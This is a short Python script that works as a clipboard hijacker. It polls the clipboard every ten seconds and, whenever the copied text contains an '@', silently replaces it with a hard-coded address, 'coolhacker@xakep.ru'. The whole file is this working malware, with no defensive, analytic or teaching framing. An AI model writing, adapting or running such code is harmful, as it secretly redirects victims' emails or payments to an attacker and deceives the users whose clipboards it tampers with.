import pyperclip
import time

email = 'coolhacker@xakep.ru'

while True:
    buffer = pyperclip.paste()
    for symbol in buffer:
        if symbol == '@':
            pyperclip.copy(email)
            continue
    time.sleep(10)